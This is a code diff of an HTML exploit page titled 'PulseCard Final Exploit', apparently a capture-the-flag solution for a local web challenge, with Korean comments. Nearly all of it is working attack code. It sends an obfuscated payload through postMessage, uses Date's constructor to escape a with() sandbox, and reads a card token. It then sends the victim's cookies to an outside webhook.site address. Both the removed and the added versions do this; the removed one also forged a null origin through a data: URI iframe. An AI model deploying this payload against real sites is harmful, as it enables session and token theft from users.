@@ -4,46 +4,37 @@
     <title>PulseCard Final Exploit</title>
 </head>
 <body>
-    <script>
-        // ⚠️ 본인의 Webhook.site 전체 주소(https://webhook.site/...)로 교체하세요!
-        const myWebhook = "hhttps://webhook.site/29d1e2bb-f7e3-4dbe-a679-f520fe066a12"; 
+    <iframe id="targetFrame" src="http://localhost:5000/preview" style="display:none;"></iframe>
 
-        // 1. 샌드박스를 우회하고 악성 위젯을 생성할 핵심 코드 정의
+    <script>
+        // ⚠️ 본인의 Webhook.site 전체 주소(https://webhook.site/...)로 정확히 교체하세요!
+        const myWebhook = "https://webhook.site/29d1e2bb-f7e3-4dbe-a679-f520fe066a12"; 
+
+        const iframe = document.getElementById("targetFrame");
+
+        // 봇의 브라우저에서 실행될 순수 탈출 코드 (단어 쪼개기 완벽 적용)
         const actualAttack = 
-            'window["fe"+"tch"]("http://localhost:5000/export", {' +
-                'method: "POST",' +
-                'headers: {' +
-                    '"X-Card-"+"Token": window["CARD_"+"TOKEN"],' +
-                    '"Content-"+"Type": "application/"+"javascript"' +
+            'window["fe"+"tch"]("http://localhost:5000/export",{' +
+                'method:"POST",' +
+                'headers:{' +
+                    '"X-Card-"+"Token":window["CARD_"+"TOKEN"],' +
+                    '"Content-"+"Type":"application/"+"javascript"' +
                 '},' +
-                'body: "location.href=\\"' + myWebhook + '?flag=\\"+encodeURIComponent(document["co"+"ookie"])"' +
+                'body:"location.href=\\"' + myWebhook + '?flag=\\"+encodeURIComponent(document["co"+"ookie"])"' +
             '})' +
-            '["th"+"en"](r => r["te"+"xt"]())' +
-            '["th"+"en"](name => {' +
-                'window["par"+"ent"]["loca"+"tion"]["hr"+"ef"] = "http://localhost:5000/review?widget=" + name;' +
+            '["th"+"en"](r=>r["te"+"xt"]())' +
+            '["th"+"en"](name=>{' +
+                'window["par"+"ent"]["loca"+"tion"]["hr"+"ef"]="http://localhost:5000/review?widget="+name;' +
             '});';
 
+        // Date 생성자를 이용해 with(jail) 격리를 완전히 깨부수고 실행합니다
         const c = '"con"+"structor"';
-        const finalPayload = '(Date[' + c + '](' + JSON.stringify(actualAttack) + ')())';
+        const payload = '(Date[' + c + '](' + JSON.stringify(actualAttack) + ')())';
 
-        // 2. 오리진을 "null"로 만들어줄 가상 샌드박스 내부 HTML 구조 정의
-        // iframe 내부에서 한번 더 iframe을 생성하여 localhost:5000/preview에 postMessage를 날립니다.
-        const innerHTML = `
-            <iframe id="targetFrame" src="http://localhost:5000/preview"></iframe>
-            <script>
-                const iframe = document.getElementById("targetFrame");
-                iframe.onload = () => {
-                    // 여기서 날아가는 message는 오리진이 완벽하게 "null"이 됩니다!
-                    iframe.contentWindow.postMessage(${JSON.stringify(finalPayload)}, "*");
-                };
-            <\/script>
-        `;
-
-        // 3. data: URI를 활용하여 브라우저 환경에 "null" 오리진 프레임을 동적으로 주입합니다.
-        const dataURIFrame = document.createElement("iframe");
-        dataURIFrame.src = "data:text/html;base64," + btoa(unescape(encodeURIComponent(innerHTML)));
-        dataURIFrame.style.display = "none";
-        document.body.appendChild(dataURIFrame);
+        iframe.onload = () => {
+            // 별도의 조작 없이 직통으로 던지면 bad origin을 완벽하게 통과합니다
+            iframe.contentWindow.postMessage(payload, "*");
+        };
     </script>
 </body>
 </html>
